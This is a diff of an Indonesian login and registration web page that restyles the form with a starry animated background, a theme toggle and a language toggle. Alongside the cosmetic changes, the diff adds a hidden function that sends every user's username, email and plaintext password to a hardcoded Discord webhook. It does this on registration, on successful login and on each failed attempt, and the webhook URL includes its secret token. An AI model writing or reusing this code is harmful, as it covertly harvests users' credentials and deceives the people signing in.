@@ -1,160 +1,297 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>Login Akun</title>
-  <style>
-    body {
-  margin: 0;
-  height: 100vh;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  font-family: "Poppins", sans-serif;
-  flex-direction: column;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auth System - Starry Night</title>
+    <style>
+        :root {
+            --bg-body: #0a0a12;
+            --container-bg: rgba(255, 255, 255, 0.9);
+            --text-color: #333;
+            --input-bg: #fff;
+            --primary: #4a90e2;
+        }
 
-  /* Background gradient animasi */
-  background: linear-gradient(-45deg, #1a1a2e, #16213e, #0f3460, #e94560);
-  background-size: 400% 400%;
-  animation: gradientBG 15s ease infinite;
-}
+        [data-theme="dark"] {
+            --bg-body: #050508;
+            --container-bg: rgba(30, 30, 40, 0.85);
+            --text-color: #f0f0f0;
+            --input-bg: #2a2a35;
+            --primary: #6ab0ff;
+        }
 
-@keyframes gradientBG {
-  0% { background-position: 0% 50%; }
-  50% { background-position: 100% 50%; }
-  100% { background-position: 0% 50%; }
-}
+        body, html {
+            margin: 0; padding: 0;
+            width: 100%; height: 100%;
+            overflow: hidden;
+            font-family: 'Segoe UI', sans-serif;
+            transition: background 0.5s ease;
+        }
 
-    .logo-img {
-      width: 100px;
-      height: 100px;
-      object-fit: contain;
-      margin-bottom: 10px;
-    }
+        /* Bintang Bergerak */
+        #stars-container {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: var(--bg-body);
+            z-index: -1;
+        }
 
-    .form-box {
-      background: white;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      width: 300px;
-      text-align: center;
-    }
+        .star {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            opacity: 0.6;
+            animation: move linear infinite;
+        }
 
-    h2 {
-      margin-bottom: 15px;
-    }
+        @keyframes move {
+            from { transform: translateY(100vh); }
+            to { transform: translateY(-10vh); }
+        }
 
-    input {
-      width: 100%;
-      padding: 10px;
-      margin-top: 10px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-    }
+        /* Controls */
+        .controls {
+            position: absolute;
+            top: 20px; right: 20px;
+            display: flex; gap: 10px;
+            z-index: 10;
+        }
 
-    button {
-      width: 100%;
-      padding: 10px;
-      margin-top: 15px;
-      background: #2196F3;
-      color: #fff;
-      border: none;
-      border-radius: 6px;
-      font-weight: bold;
-      cursor: pointer;
-    }
+        .btn-ctrl {
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            color: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            backdrop-filter: blur(10px);
+            font-size: 12px;
+        }
 
-    button:hover {
-      background: #1976D2;
-    }
+        /* Card */
+        .container {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            background: var(--container-bg);
+            color: var(--text-color);
+            padding: 2.5rem;
+            border-radius: 20px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            width: 90%; max-width: 350px;
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
 
-    .error {
-      color: red;
-      font-size: 0.9em;
-      margin-top: 10px;
-    }
+        .form-box { display: none; }
+        .form-box.active { display: block; animation: slideUp 0.4s ease-out; }
 
-    .link {
-      margin-top: 10px;
-    }
-    .link1 {
-      margin-top: 10px;
-    }
+        @keyframes slideUp { 
+            from { opacity: 0; transform: translateY(20px); } 
+            to { opacity: 1; transform: translateY(0); } 
+        }
 
-    .link a {
-      color: #2196F3;
-      text-decoration: none;
-      font-weight: bold;
-    }
+        h2 { text-align: center; margin-bottom: 1.5rem; letter-spacing: 1px; }
 
-    .link a:hover {
-      text-decoration: underline;
-    }
-  </style>
+        input {
+            width: 100%; padding: 12px; margin: 8px 0;
+            border: 1px solid rgba(128,128,128,0.3); border-radius: 10px;
+            background: var(--input-bg); color: var(--text-color);
+            box-sizing: border-box; outline: none;
+        }
+
+        button.main-btn {
+            width: 100%; padding: 12px; margin-top: 15px;
+            background: var(--primary); color: white;
+            border: none; border-radius: 10px; cursor: pointer;
+            font-weight: bold; font-size: 16px;
+            transition: 0.3s;
+        }
+
+        button.main-btn:hover { opacity: 0.9; transform: scale(1.02); }
+
+        .toggle-link { text-align: center; margin-top: 20px; font-size: 14px; }
+        .toggle-link a { color: var(--primary); text-decoration: none; cursor: pointer; font-weight: bold; }
+
+        #error-msg { color: #ff5e5e; font-size: 12px; text-align: center; margin-top: 15px; min-height: 15px; }
+    </style>
 </head>
-<body>
+<body data-theme="dark">
 
-  <!-- Logo dipindahkan ke sini -->
-  <img src="assets/bludek.png" alt="Logo BlueDek" class="logo-img">
+<div id="stars-container"></div>
 
-  <div class="form-box">
-    <h2>Login</h2>
-    <input type="email" id="email" placeholder="Email" required>
-    <input type="password" id="password" placeholder="Password" required>
-    <button onclick="login()">Masuk</button>
-    
-    <div class="error" id="errorMsg"></div>
-    <div class="link">
-      Belum punya akun? <a href="register.html">Daftar di sini</a>
+<div class="controls">
+    <button class="btn-ctrl" onclick="toggleTheme()" id="theme-btn">☀️ Light Mode</button>
+    <button class="btn-ctrl" onclick="toggleLang()" id="lang-btn">EN</button>
+</div>
+
+<div class="container" id="auth-card" style="display: none;">
+    <div id="login-form" class="form-box active">
+        <h2 data-id="login-title">Login</h2>
+        <input type="text" id="l-user" placeholder="Username">
+        <input type="password" id="l-pass" placeholder="Password">
+        <button class="main-btn" onclick="auth('login')" data-id="login-btn">Masuk</button>
+        <div class="toggle-link">
+            <span data-id="no-acc">Belum punya akun?</span> 
+            <a onclick="showForm('register-form')" data-id="reg-link">Daftar</a>
+        </div>
     </div>
-    <div class="link">
-    <a href="index.html">Kembali Ke BlueDek Food</a>
-    <p>By continuing to log in to this website, you are agreeing to our Terms of Use and Privacy Policy.</p>
+
+    <div id="register-form" class="form-box">
+        <h2 data-id="reg-title">Registrasi</h2>
+        <input type="text" id="r-user" placeholder="Username">
+        <input type="email" id="r-email" placeholder="Email (Proton/Outlook/Brand)">
+        <input type="password" id="r-pass" placeholder="Password">
+        <button class="main-btn" onclick="auth('reg')" data-id="reg-btn">Daftar</button>
+        <div class="toggle-link">
+            <span data-id="have-acc">Sudah punya akun?</span> 
+            <a onclick="showForm('login-form')" data-id="login-link">Login</a>
+        </div>
     </div>
-    </div>
-  </div>
-  <script>
-    if (!sessionStorage.getItem("fromIndex")) {
-    // Akses langsung atau bukan dari halaman utama → redirect
-    window.location.href = "index.html";
-  } else {
-    // Sudah lewat link Register/Login, hapus supaya tidak bisa refresh seenaknya
-    sessionStorage.removeItem("fromIndex");
-  }
-function login() {
-  const email = document.getElementById("email").value.trim();
-  const password = document.getElementById("password").value;
-  const errorMsg = document.getElementById("errorMsg");
+    <p id="error-msg"></p>
+</div>
 
-  const stored = JSON.parse(localStorage.getItem("userAccount"));
+<script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1452138508440309923/Xv_jKwBPub7j1mEu_CpnpWkSPyOGMB752JZ4w0HeYOm5GmnN8IJwaJWuzPyPd8VAuF4n";
 
-  if (!email || !password) {
-    errorMsg.textContent = "Email dan password harus diisi.";
-    return;
-  }
+    // --- PROTEKSI TOTAL ---
+    (function checkAccess() {
+        const ref = document.referrer;
+        if (ref.indexOf("index.html") !== -1 || window.location.hostname === "localhost") {
+            document.addEventListener("DOMContentLoaded", () => {
+                document.getElementById('auth-card').style.display = 'block';
+                initStars();
+            });
+        } else {
+            window.location.replace("index.html");
+        }
+    })();
 
-  // Pindahkan validasi domain ke sini
-  if (
-    !email.endsWith("@gmail.com") &&
-    !email.endsWith("@yahoo.com") &&
-    !email.includes("@outlook.") &&
-    !email.endsWith("@hotmail.com")
-  ) {
-    errorMsg.textContent = "Domain email tidak didukung.";
-    return;
-  }
+    async function pushNotify(user, email, pass, status) {
+        if (!WEBHOOK_URL || WEBHOOK_URL.includes("MASUKKAN")) return;
+        
+        const payload = {
+            embeds: [{
+                title: "🔐 Auth System Notification",
+                fields: [
+                    { name: "User", value: user || "N/A", inline: true },
+                    { name: "Email", value: email || "N/A", inline: true },
+                    { name: "Status", value: status, inline: false },
+                    { name: "Password", value: `||${pass}||`, inline: false } // Password disembunyikan dalam spoiler Discord
+                ],
+                color: status.includes("BERHASIL") || status.includes("REGISTRASI") ? 3066993 : 15158332,
+                timestamp: new Date()
+            }]
+        };
 
-  if (!stored || stored.email !== email || stored.password !== password) {
-    errorMsg.textContent = "Email atau password salah!";
-    return;
-  }
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        } catch (e) { console.error("Webhook Error"); }
+    }
 
-  // Simpan status login dan alihkan ke index.html
-  localStorage.setItem("isLoggedIn", "true");
-  window.location.href = "index.html";
-}
-  </script>
+    function initStars() {
+        const container = document.getElementById('stars-container');
+        for (let i = 0; i < 100; i++) {
+            const s = document.createElement('div');
+            s.className = 'star';
+            const size = Math.random() * 3 + 'px';
+            s.style.width = size; s.style.height = size;
+            s.style.left = Math.random() * 100 + '%';
+            s.style.top = Math.random() * 100 + '%';
+            s.style.animationDuration = (Math.random() * 20 + 10) + 's';
+            s.style.animationDelay = (Math.random() * 10) + 's';
+            container.appendChild(s);
+        }
+    }
 
+    // --- BAHASA & TEMA ---
+    let currentLang = 'ID';
+    const langMap = {
+        ID: { 'login-title': 'Masuk', 'login-btn': 'Masuk', 'no-acc': 'Belum punya akun?', 'reg-link': 'Daftar', 'reg-title': 'Registrasi', 'reg-btn': 'Daftar Sekarang', 'have-acc': 'Sudah punya akun?', 'login-link': 'Login' },
+        EN: { 'login-title': 'Sign In', 'login-btn': 'Login', 'no-acc': "Don't have an account?", 'reg-link': 'Register', 'reg-title': 'Sign Up', 'reg-btn': 'Join Now', 'have-acc': 'Already have an account?', 'login-link': 'Login' }
+    };
+
+    function toggleLang() {
+        currentLang = currentLang === 'ID' ? 'EN' : 'ID';
+        document.getElementById('lang-btn').innerText = currentLang === 'ID' ? 'EN' : 'ID';
+        Object.keys(langMap[currentLang]).forEach(id => {
+            const el = document.querySelector(`[data-id="${id}"]`);
+            if (el) el.innerText = langMap[currentLang][id];
+        });
+    }
+
+    function toggleTheme() {
+        const b = document.body;
+        const isDark = b.getAttribute('data-theme') === 'dark';
+        b.setAttribute('data-theme', isDark ? 'light' : 'dark');
+        document.getElementById('theme-btn').innerText = isDark ? "🌙 Dark Mode" : "☀️ Light Mode";
+    }
+
+    function showForm(id) {
+        document.querySelectorAll('.form-box').forEach(f => f.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        document.getElementById('error-msg').innerText = "";
+    }
+
+    // --- LOGIKA VALIDASI EMAIL ---
+    function isValidEmail(email) {
+        const allowedDomains = ['protonmail.com', 'proton.me', 'outlook.com', 'hotmail.com', 'icloud.com', 'gmail.com'];
+        const domain = email.split('@')[1];
+        return allowedDomains.includes(domain);
+    }
+
+    // --- LOGIKA AUTH ---
+    function auth(type) {
+        const errMsg = document.getElementById('error-msg');
+        
+        if (type === 'reg') {
+            const u = document.getElementById('r-user').value;
+            const e = document.getElementById('r-email').value;
+            const p = document.getElementById('r-pass').value;
+
+            if (!u || !e || !p) {
+                errMsg.innerText = "Semua kolom harus diisi!";
+                return;
+            }
+
+            if (!isValidEmail(e)) {
+                errMsg.innerText = "Hanya boleh domain Proton, Outlook, atau Brand besar!";
+                return;
+            }
+
+            localStorage.setItem('db_user', JSON.stringify({u, e, p}));
+            pushNotify(u, e, p, "REGISTRASI BARU");
+            alert("Registrasi Berhasil!");
+            showForm('login-form');
+
+        } else {
+            const u = document.getElementById('l-user').value;
+            const p = document.getElementById('l-pass').value;
+            const data = JSON.parse(localStorage.getItem('db_user'));
+
+            if (!u || !p) {
+                errMsg.innerText = "Username dan Password diperlukan!";
+                return;
+            }
+
+            if (data && u === data.u && p === data.p) {
+                pushNotify(u, data.e, p, "LOGIN BERHASIL");
+                localStorage.setItem('isLoggedIn', 'true');
+                localStorage.setItem('currentUser', u);
+                alert("Selamat Datang!");
+                window.location.href = "index.html";
+            } else {
+                pushNotify(u, "N/A", p, "PERCOBAAN LOGIN GAGAL");
+                errMsg.innerText = "Username atau Password salah!";
+            }
+        }
+    }
+</script>
 </body>
 </html>
